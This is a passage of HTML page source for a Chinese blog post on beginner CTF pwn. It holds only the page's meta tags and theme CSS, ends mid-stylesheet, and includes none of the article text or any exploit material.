<!DOCTYPE html>
<html lang="en">
    <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/#6.0.0-alpha.1'>
  <meta name="generator" content="Hexo 7.3.0">
  <meta name="Volantis" content="6.0.0-alpha.1">
  <meta charset="utf-8">
  <meta name="google-site-verification" content="62GZuQzI8vKz1vqtq9cAt9WNIDJQQ-v_-hBV6ghqPT4" />    
  <!-- 上面这行是给谷歌验证的 -->
   
  <!-- SEO相关 -->
  
  <link rel="canonical" href="https://archer-baiyi.github.io/en/2025/05/12/ctf/pwn/pwn入门/"/>
  <!-- 渲染优化 -->
    <meta http-equiv='x-dns-prefetch-control' content='on' />
      <link rel='dns-prefetch' href='https://unpkg.com'>
      <link rel="preconnect" href="https://unpkg.com" crossorigin>
      <link rel='dns-prefetch' href='https://cdn.bootcdn.net'>
      <link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Content-Security-Policy" content=" default-src 'self' https:; block-all-mixed-content; base-uri 'self' https:; form-action 'self' https:; worker-src 'self' https:; connect-src 'self' https: *; img-src 'self' data: https: *; media-src 'self' https: *; font-src 'self' data: https: *; frame-src 'self' https: *; manifest-src 'self' https: *; child-src https:; script-src 'self' https: 'unsafe-inline' *; style-src 'self' https: 'unsafe-inline' *; ">
  <meta name="HandheldFriendly" content="True" >
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
  <meta content="telephone=no" name="format-detection">
  <!-- import head_begin begin -->
  <!-- import head_begin end -->
  <!-- Custom Files headBegin begin-->
  
  <!-- Custom Files headBegin end-->
    <link rel="shortcut icon" type='image/x-icon' href="/en/%E7%90%83%E9%9C%9C_%E5%8D%A1%E9%80%9A.png">
  <link rel="preload" href="/en/css/style.css" as="style">
  <link rel="preload" href="https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/VarelaRound/VarelaRound-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
<link rel="preload" href="https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <!-- feed -->
  <!-- 页面元数据 -->
  <title>CTF Pwn 入门 - Hexo</title>
  <meta name="keywords" content="Pwn,null">
  <meta desc name="description" content="零基础Pwn入门 - null - Hexo">
  
<meta property="og:type" content="article">
<meta property="og:title" content="CTF Pwn 入门">
<meta property="og:url" content="https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/Pwn%E5%85%A5%E9%97%A8/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="零基础Pwn入门">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
<meta property="article:published_time" content="2025-05-12T15:01:08.000Z">
<meta property="article:modified_time" content="2026-02-06T23:43:56.842Z">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
  <style>
    /* 首屏样式 */
    #safearea {
  display: none;
}
:root {
  --color-site-body: #f4f4f4;
  --color-site-bg: #f4f4f4;
  --color-site-inner: #fff;
  --color-site-footer: #666;
  --color-card: #fff;
  --color-text: #444;
  --color-block: #f6f6f6;
  --color-inlinecode: #c74f00;
  --color-codeblock: #fff7ea;
  --color-h1: #3a3a3a;
  --color-h2: #3a3a3a;
  --color-h3: #333;
  --color-h4: #444;
  --color-h5: #555;
  --color-h6: #666;
  --color-p: #444;
  --color-list: #666;
  --color-list-hl: #30ad91;
  --color-meta: #888;
  --color-read-bkg: #e0d8c8;
  --color-read-post: #f8f1e2;
  --color-copyright-bkg: #f5f5f5;
}
* {
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  outline: none;
  margin: 0;
  padding: 0;
}
*::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
*::-webkit-scrollbar-track-piece {
  background: transparent;
}
*::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
*::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
html {
  color: var(--color-text);
  width: 100%;
  height: 100%;
  font-family: UbuntuMono, "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Menlo, Monaco, monospace, sans-serif;
  font-size: 16px;
}
html >::-webkit-scrollbar {
  height: 4px;
  width: 4px;
}
html >::-webkit-scrollbar-track-piece {
  background: transparent;
}
html >::-webkit-scrollbar-thumb {
  background: #3dd9b6;
  cursor: pointer;
  border-radius: 2px;
  -webkit-border-radius: 2px;
}
html >::-webkit-scrollbar-thumb:hover {
  background: #ff5722;
}
body {
  background-color: var(--color-site-body);
  text-rendering: optimizelegibility;
  -webkit-tap-highlight-color: rgba(0,0,0,0);
  line-height: 1.6;
  -webkit-text-size-adjust: 100%;
  -ms-text-size-adjust: 100%;
}
body.modal-active {
  overflow: hidden;
}
@media screen and (max-width: 680px) {
  body.modal-active {
    position: fixed;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
  }
}
a {
  color: #2092ec;
  cursor: pointer;
  text-decoration: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
a:hover {
  color: #ff5722;
}
a:active,
a:hover {
  outline: 0;
}
ul,
ol {
  padding-left: 0;
}
ul li,
ol li {
  list-style: none;
}
header {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
img {
  border: 0;
  background: none;
  max-width: 100%;
}
svg:not(:root) {
  overflow: hidden;
}
hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  height: 0;
  border: 0;
  border-radius: 1px;
  -webkit-border-radius: 1px;
  border-bottom: 1px solid rgba(68,68,68,0.1);
}
button,
input {
  color: inherit;
  font: inherit;
  margin: 0;
}
button {
  overflow: visible;
  text-transform: none;
  -webkit-appearance: button;
  cursor: pointer;
}
@supports (backdrop-filter: blur(20px)) {
  .blur {
    background: rgba(255,255,255,0.9) !important;
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.shadow {
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.shadow.floatable {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.shadow.floatable:hover {
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.1), 0 4px 8px 0px rgba(0,0,0,0.1), 0 8px 16px 0px rgba(0,0,0,0.1);
}
#l_cover {
  min-height: 64px;
}
.cover-wrapper {
  top: 0;
  left: 0;
  max-width: 100%;
  height: 100vh;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  align-self: center;
  align-content: center;
  color: var(--color-site-inner);
  padding: 0 16px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  position: relative;
  overflow: hidden;
  margin-bottom: -100px;
}
.cover-wrapper .cover-body {
  z-index: 1;
  position: relative;
  width: 100%;
  height: 100%;
}
.cover-wrapper#full {
  height: calc(100vh + 100px);
  padding-bottom: 100px;
}
.cover-wrapper#half {
  max-height: 640px;
  min-height: 400px;
  height: calc(36vh - 64px + 200px);
}
.cover-wrapper #scroll-down {
  width: 100%;
  height: 64px;
  position: absolute;
  bottom: 100px;
  text-align: center;
  cursor: pointer;
}
.cover-wrapper #scroll-down .scroll-down-effects {
  color: #fff;
  font-size: 24px;
  line-height: 64px;
  position: absolute;
  width: 24px;
  left: calc(50% - 12px);
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
  animation: scroll-down-effect 1.5s infinite;
  -webkit-animation: scroll-down-effect 1.5s infinite;
  -khtml-animation: scroll-down-effect 1.5s infinite;
  -moz-animation: scroll-down-effect 1.5s infinite;
  -o-animation: scroll-down-effect 1.5s infinite;
  -ms-animation: scroll-down-effect 1.5s infinite;
}
@-moz-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes scroll-down-effect {
  0% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
  50% {
    top: -16px;
    opacity: 0.4;
    -webkit-opacity: 0.4;
    -moz-opacity: 0.4;
  }
  100% {
    top: 0;
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.cover-wrapper .cover-body {
  margin-top: 64px;
  margin-bottom: 100px;
}
.cover-wrapper .cover-body,
.cover-wrapper .cover-body .top,
.cover-wrapper .cover-body .bottom {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  max-width: 100%;
}
.cover-wrapper .cover-body .bottom {
  margin-top: 32px;
}
.cover-wrapper .cover-body .title {
  font-family: "Varela Round", "PingFang SC", "Microsoft YaHei", Helvetica, Arial, Helvetica, monospace;
  font-size: 3.125rem;
  line-height: 1.2;
  text-shadow: 0 1px 2px rgba(0,0,0,0.1);
}
.cover-wrapper .cover-body .subtitle {
  font-size: 20px;
}
.cover-wrapper .cover-body .logo {
  max-height: 120px;
  max-width: calc(100% - 4 * 16px);
}
@media screen and (min-height: 1024px) {
  .cover-wrapper .cover-body .title {
    font-size: 3rem;
  }
  .cover-wrapper .cover-body .subtitle {
    font-size: 1.05rem;
  }
  .cover-wrapper .cover-body .logo {
    max-height: 150px;
  }
}
.cover-wrapper .cover-body .m_search {
  position: relative;
  max-width: calc(100% - 16px);
  width: 320px;
  vertical-align: middle;
}
.cover-wrapper .cover-body .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  width: 100%;
}
.cover-wrapper .cover-body .m_search .icon,
.cover-wrapper .cover-body .m_search .input {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.cover-wrapper .cover-body .m_search .icon {
  position: absolute;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  line-height: 2.5rem;
  width: 32px;
  top: 0;
  left: 5px;
  color: rgba(68,68,68,0.75);
}
.cover-wrapper .cover-body .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  height: 2.5rem;
  width: 100%;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  font-size: 0.875rem;
  -webkit-appearance: none;
  padding-left: 36px;
  border-radius: 1.4rem;
  -webkit-border-radius: 1.4rem;
  background: rgba(255,255,255,0.6);
  backdrop-filter: blur(10px);
  border: none;
  color: var(--color-text);
}
@media screen and (max-width: 500px) {
  .cover-wrapper .cover-body .m_search .input {
    padding-left: 36px;
  }
}
.cover-wrapper .cover-body .m_search .input:hover {
  background: rgba(255,255,255,0.8);
}
.cover-wrapper .cover-body .m_search .input:focus {
  background: #fff;
}
.cover-wrapper .list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  flex-wrap: wrap;
  -webkit-flex-wrap: wrap;
  -khtml-flex-wrap: wrap;
  -moz-flex-wrap: wrap;
  -o-flex-wrap: wrap;
  -ms-flex-wrap: wrap;
  align-items: stretch;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.cover-wrapper .list-h a {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 0;
  -ms-flex: 1 0;
  flex: 1 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  font-weight: 600;
}
.cover-wrapper .list-h a img {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  border-radius: 2px;
  -webkit-border-radius: 2px;
  margin: 4px;
  min-width: 40px;
  max-width: 44px;
}
@media screen and (max-width: 768px) {
  .cover-wrapper .list-h a img {
    min-width: 36px;
    max-width: 40px;
  }
}
@media screen and (max-width: 500px) {
  .cover-wrapper .list-h a img {
    margin: 2px 4px;
    min-width: 32px;
    max-width: 36px;
  }
}
@media screen and (max-width: 375px) {
  .cover-wrapper .list-h a img {
    min-width: 28px;
    max-width: 32px;
  }
}
.cover-wrapper {
  max-width: 100%;
}
.cover-wrapper.search .bottom .menu {
  margin-top: 16px;
}
.cover-wrapper.search .bottom .menu .list-h a {
  white-space: nowrap;
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: horizontal;
  -moz-box-orient: horizontal;
  -webkit-flex-direction: row;
  -ms-flex-direction: row;
  flex-direction: row;
  align-items: baseline;
  padding: 2px;
  margin: 4px;
  color: var(--color-site-inner);
  opacity: 0.75;
  -webkit-opacity: 0.75;
  -moz-opacity: 0.75;
  text-shadow: 0 1px 2px rgba(0,0,0,0.05);
  border-bottom: 2px solid transparent;
}
.cover-wrapper.search .bottom .menu .list-h a i {
  margin-right: 4px;
}
.cover-wrapper.search .bottom .menu .list-h a p {
  font-size: 0.9375rem;
}
.cover-wrapper.search .bottom .menu .list-h a:hover,
.cover-wrapper.search .bottom .menu .list-h a.active,
.cover-wrapper.search .bottom .menu .list-h a:active {
  opacity: 1;
  -webkit-opacity: 1;
  -moz-opacity: 1;
  border-bottom: 2px solid var(--color-site-inner);
}
.cover-wrapper.dock .menu,
.cover-wrapper.featured .menu,
.cover-wrapper.focus .menu {
  border-radius: 6px;
  -webkit-border-radius: 6px;
}
.cover-wrapper.dock .menu .list-h a,
.cover-wrapper.featured .menu .list-h a,
.cover-wrapper.focus .menu .list-h a {
  -webkit-box-direction: normal;
  -moz-box-direction: normal;
  -webkit-box-orient: vertical;
  -moz-box-orient: vertical;
  -webkit-flex-direction: column;
  -ms-flex-direction: column;
  flex-direction: column;
  align-items: center;
  padding: 12px;
  line-height: 24px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  border-bottom: none;
  text-align: center;
  align-content: flex-end;
  color: rgba(68,68,68,0.7);
  font-size: 1.5rem;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h a,
  .cover-wrapper.featured .menu .list-h a,
  .cover-wrapper.focus .menu .list-h a {
    padding: 12px 8px;
  }
}
.cover-wrapper.dock .menu .list-h a i,
.cover-wrapper.featured .menu .list-h a i,
.cover-wrapper.focus .menu .list-h a i {
  margin: 8px;
}
.cover-wrapper.dock .menu .list-h a p,
.cover-wrapper.featured .menu .list-h a p,
.cover-wrapper.focus .menu .list-h a p {
  font-size: 0.875rem;
}
.cover-wrapper.dock .menu .list-h a.active,
.cover-wrapper.featured .menu .list-h a.active,
.cover-wrapper.focus .menu .list-h a.active {
  background: var(--color-card);
  backdrop-filter: none;
}
.cover-wrapper.dock .menu .list-h a.active i,
.cover-wrapper.featured .menu .list-h a.active i,
.cover-wrapper.focus .menu .list-h a.active i,
.cover-wrapper.dock .menu .list-h a.active i+p,
.cover-wrapper.featured .menu .list-h a.active i+p,
.cover-wrapper.focus .menu .list-h a.active i+p {
  color: #3dd9b6;
}
.cover-wrapper.dock .menu .list-h a.active img+p,
.cover-wrapper.featured .menu .list-h a.active img+p,
.cover-wrapper.focus .menu .list-h a.active img+p {
  color: var(--color-text);
}
.cover-wrapper.dock .menu .list-h a:hover,
.cover-wrapper.featured .menu .list-h a:hover,
.cover-wrapper.focus .menu .list-h a:hover {
  background: var(--color-card);
}
.cover-wrapper.dock .top {
  margin-bottom: 48px;
}
.cover-wrapper.dock .menu {
  background: rgba(255,255,255,0.5);
  position: absolute;
  bottom: 0;
  max-width: 100%;
}
.cover-wrapper.dock .menu .list-h {
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  margin: 4px;
}
.cover-wrapper.dock .menu .list-h a+a {
  margin-left: 4px;
}
@media screen and (max-width: 500px) {
  .cover-wrapper.dock .menu .list-h {
    overflow-x: scroll;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar {
    height: 0;
    width: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-track-piece {
    background: transparent;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb {
    background: #3dd9b6;
    cursor: pointer;
    border-radius: 0;
    -webkit-border-radius: 0;
  }
  .cover-wrapper.dock .menu .list-h::-webkit-scrollbar-thumb:hover {
    background: #ff5722;
  }
}
@supports (backdrop-filter: blur(20px)) {
  .cover-wrapper.dock .menu {
    background: rgba(255,255,255,0.5);
    backdrop-filter: saturate(200%) blur(20px);
  }
}
.cover-wrapper #parallax-window {
  position: absolute;
  width: 100%;
  height: 100%;
  background: transparent;
}
.parallax-mirror {
  animation-delay: 0s;
  animation-duration: 0.5s;
  animation-fill-mode: forwards;
  animation-timing-function: ease-out;
  animation-name: fadeIn;
}
@-moz-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-webkit-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@-o-keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@keyframes fadeIn {
  0% {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
    filter: blur(12px);
  }
  100% {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media (prefers-color-scheme: dark) {
  :root {
    --color-mode: 'dark';
  }
  :root:not([color-scheme]) {
    --color-site-body: #121212;
    --color-read-bkg: #1f1f1f;
    --color-read-post: #262626;
    --color-site-bg: #1f1f1f;
    --color-site-inner: rgba(238,238,238,0.871);
    --color-site-footer: rgba(170,170,170,0.871);
    --color-card: #262626;
    --color-text: rgba(238,238,238,0.871);
    --color-block: #434343;
    --color-codeblock: #1f1f1f;
    --color-inlinecode: #d56d28;
    --color-h1: rgba(255,255,255,0.871);
    --color-h2: rgba(255,255,255,0.871);
    --color-h3: rgba(255,255,255,0.6);
    --color-h4: rgba(255,255,255,0.6);
    --color-h5: rgba(255,255,255,0.6);
    --color-h6: rgba(255,255,255,0.6);
    --color-p: rgba(217,217,217,0.871);
    --color-list: rgba(217,217,217,0.871);
    --color-list-hl: #63e0c4;
    --color-meta: rgba(191,191,191,0.871);
    --color-link: rgba(191,191,191,0.871);
    --color-copyright-bkg: #21252b;
  }
  :root:not([color-scheme]) img {
    filter: brightness(70%) !important;
  }
  :root:not([color-scheme]) .blur {
    background: rgba(31,31,31,0.9) !important;
  }
  :root:not([color-scheme]) .white-box.blur {
    background: rgba(38,38,38,0.9) !important;
  }
  :root:not([color-scheme]) .nav-main .u-search-input {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) #l_main .article .prev-next>a:hover {
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) .article blockquote {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .article-title a {
    color: var(--color-h1) !important;
  }
  :root:not([color-scheme]) details>summary {
    color: var(--color-p) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) details {
    border: 1px solid var(--color-site-bg) !important;
    background: var(--color-site-bg) !important;
  }
  :root:not([color-scheme]) #u-search .modal,
  :root:not([color-scheme]) #u-search .modal-header,
  :root:not([color-scheme]) #u-search .modal-body {
    background: var(--color-card) !important;
  }
  :root:not([color-scheme]) #u-search .modal-body .modal-results .result:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:hover {
    background: var(--color-block) !important;
  }
  :root:not([color-scheme]) .u-search-input:focus {
    background: var(--color-site-body) !important;
  }
}
[color-scheme='dark'] {
  --color-site-body: #121212;
  --color-read-bkg: #1f1f1f;
  --color-read-post: #262626;
  --color-site-bg: #1f1f1f;
  --color-site-inner: rgba(238,238,238,0.871);
  --color-site-footer: rgba(170,170,170,0.871);
  --color-card: #262626;
  --color-text: rgba(238,238,238,0.871);
  --color-block: #434343;
  --color-codeblock: #1f1f1f;
  --color-inlinecode: #d56d28;
  --color-h1: rgba(255,255,255,0.871);
  --color-h2: rgba(255,255,255,0.871);
  --color-h3: rgba(255,255,255,0.6);
  --color-h4: rgba(255,255,255,0.6);
  --color-h5: rgba(255,255,255,0.6);
  --color-h6: rgba(255,255,255,0.6);
  --color-p: rgba(217,217,217,0.871);
  --color-list: rgba(217,217,217,0.871);
  --color-list-hl: #63e0c4;
  --color-meta: rgba(191,191,191,0.871);
  --color-link: rgba(191,191,191,0.871);
  --color-copyright-bkg: #21252b;
}
[color-scheme='dark'] img {
  filter: brightness(70%) !important;
}
[color-scheme='dark'] .blur {
  background: rgba(31,31,31,0.9) !important;
}
[color-scheme='dark'] .white-box.blur {
  background: rgba(38,38,38,0.9) !important;
}
[color-scheme='dark'] .nav-main .u-search-input {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a {
  background: var(--color-block) !important;
}
[color-scheme='dark'] #l_main .article .prev-next>a:hover {
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] .article blockquote {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .article-title a {
  color: var(--color-h1) !important;
}
[color-scheme='dark'] details>summary {
  color: var(--color-p) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] details {
  border: 1px solid var(--color-site-bg) !important;
  background: var(--color-site-bg) !important;
}
[color-scheme='dark'] #u-search .modal,
[color-scheme='dark'] #u-search .modal-header,
[color-scheme='dark'] #u-search .modal-body {
  background: var(--color-card) !important;
}
[color-scheme='dark'] #u-search .modal-body .modal-results .result:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:hover {
  background: var(--color-block) !important;
}
[color-scheme='dark'] .u-search-input:focus {
  background: var(--color-site-body) !important;
}
@media screen and (max-width: 500px) {
  [color-scheme='dark'] .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}
@font-face {
  font-family: 'UbuntuMono';
  src: url("https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/UbuntuMono/UbuntuMono-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
@font-face {
  font-family: 'Varela Round';
  src: url("https://unpkg.com/volantis-static@0.0.1660614606622/media/fonts/VarelaRound/VarelaRound-Regular.ttf");
  font-weight: 'normal';
  font-style: 'normal';
  font-display: swap;
}
.l_header {
  position: fixed;
  z-index: 1000;
  top: 0;
  width: 100%;
  height: 64px;
  background: var(--color-card);
  box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1);
}
.l_header.auto {
  transition: opacity 0.4s ease;
  -webkit-transition: opacity 0.4s ease;
  -khtml-transition: opacity 0.4s ease;
  -moz-transition: opacity 0.4s ease;
  -o-transition: opacity 0.4s ease;
  -ms-transition: opacity 0.4s ease;
  visibility: hidden;
}
.l_header.auto.show {
  opacity: 1 !important;
  -webkit-opacity: 1 !important;
  -moz-opacity: 1 !important;
  visibility: visible;
}
.l_header .container {
  margin-left: 16px;
  margin-right: 16px;
}
.l_header #wrapper {
  height: 100%;
  user-select: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
}
.l_header #wrapper .nav-main,
.l_header #wrapper .nav-sub {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  flex-wrap: nowrap;
  -webkit-flex-wrap: nowrap;
  -khtml-flex-wrap: nowrap;
  -moz-flex-wrap: nowrap;
  -o-flex-wrap: nowrap;
  -ms-flex-wrap: nowrap;
  justify-content: space-between;
  -webkit-justify-content: space-between;
  -khtml-justify-content: space-between;
  -moz-justify-content: space-between;
  -o-justify-content: space-between;
  -ms-justify-content: space-between;
  align-items: center;
}
.l_header #wrapper .nav-main {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.l_header #wrapper.sub .nav-main {
  transform: translateY(-64px);
  -webkit-transform: translateY(-64px);
  -khtml-transform: translateY(-64px);
  -moz-transform: translateY(-64px);
  -o-transform: translateY(-64px);
  -ms-transform: translateY(-64px);
}
.l_header #wrapper .nav-sub {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  opacity: 0;
  -webkit-opacity: 0;
  -moz-opacity: 0;
  height: 64px;
  width: calc(100% - 2 * 16px);
  position: absolute;
}
.l_header #wrapper .nav-sub ::-webkit-scrollbar {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
